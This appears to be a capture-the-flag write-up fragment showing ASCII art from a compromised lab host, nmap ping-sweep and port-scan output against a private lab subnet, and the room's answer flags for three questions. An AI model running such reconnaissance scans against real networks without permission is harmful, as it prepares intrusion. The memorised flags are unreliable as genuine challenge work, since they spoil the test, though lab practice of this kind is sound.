root@Labyrinth:/root# file maze
maze: ASCII text
root@Labyrinth:/root# cat -v maze
88888888888888888888888888888888888888888888888888888888888888888888888
88.._|      | `-.  | `.  -_-_ _-_  _-  _- -_ -  .'|   |.'|     |  _..88
88   `-.._  |    |`!  |`.  -_ -__ -_ _- _-_-  .'  |.;'   |   _.!-'|  88
88      | `-!._  |  `;!  ;. _______________ ,'| .-' |   _!.i'     |  88
88..__  |     |`-!._ | `.| |_______________||."'|  _!.;'   |     _|..88
88   |``"..__ |    |`";.| i|_|MMMMMMMMMMM|_|'| _!-|   |   _|..-|'    88
88   |      |``--..|_ | `;!|l|MMoMMMMoMMM|1|.'j   |_..!-'|     |     88
88   |      |    |   |`-,!_|_|MMMMP'YMMMM|_||.!-;'  |    |     |     88
88___|______|____!.,.!,.!,!|d|MMMo * loMM|p|,!,.!.,.!..__|_____|_____88
88      |     |    |  |  | |_|MMMMb,dMMMM|_|| |   |   |    |      |  88
88      |     |    |..!-;'i|r|MPYMoMMMMoM|r| |`-..|   |    |      |  88
88      |    _!.-j'  | _!,"|_|M<>MMMMoMMM|_||!._|  `i-!.._ |      |  88
88     _!.-'|    | _."|  !;|1|MbdMMoMMMMM|l|`.| `-._|    |``-.._  |  88
88..-i'     |  _.''|  !-| !|_|MMMoMMMMoMM|_|.|`-. | ``._ |     |``"..88
88   |      |.|    |.|  !| |u|MoMMMMoMMMM|n||`. |`!   | `".    |     88
88   |  _.-'  |  .'  |.' |/|_|MMMMoMMMMoM|_|! |`!  `,.|    |-._|     88
88  _!"'|     !.'|  .'| .'|[@]MMMMMMMMMMM[@] \|  `. | `._  |   `-._  88
88-'    |   .'   |.|  |/| /                 \|`.  |`!    |.|      |`-88
88      |_.'|   .' | .' |/                   \  \ |  `.  | `._-   |  88
88     .'   | .'   |/|  /                     \ |`!   |`.|    `.  |  88
88  _.'     !'|   .' | /                       \|  `  |  `.    |`.|  88
88888888888888888888888888888888888888888888888888888888888888888888888

minos@Minos:/$ nmap -sn 10.71.235.255/24
nmap -sn 10.71.235.255/24

Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-20 18:08 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for ip-10-71-235-1.eu-west-1.compute.internal (10.71.235.1)
Host is up (-0.20s latency).
MAC Address: FE:46:D7:FA:E5:31 (Unknown)
Nmap scan report for Athens.lxd (10.71.235.37)
Host is up (0.000017s latency).
MAC Address: 00:16:3E:9E:36:DA (Xensource)
Nmap scan report for Labyrinth.lxd (10.71.235.159)
Host is up (0.000014s latency).
MAC Address: 00:16:3E:65:94:47 (Xensource)
Nmap scan report for Minos.lxd (10.71.235.7)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 5.64 seconds

minos@Minos:/$ nmap 10.71.235.37
nmap 10.71.235.37

Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-20 18:11 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for Athens.lxd (10.71.235.37)
Host is up (0.0000070s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:16:3E:9E:36:DA (Xensource)

```

![[Pasted image 20230701231448.png]]

What is the Minos flag?  

*THM{499a89a2a064426921732e7d31bc08a} *

What is the Labyrinth flag?  

*THM{6154ea526254375613650183962bf431}*

What is the Minotaur flag?  

*THM{c307b8045208fac06b9faa90e68d2ad4}*

What is the Athens flag?

**








[[You're in a cave]]
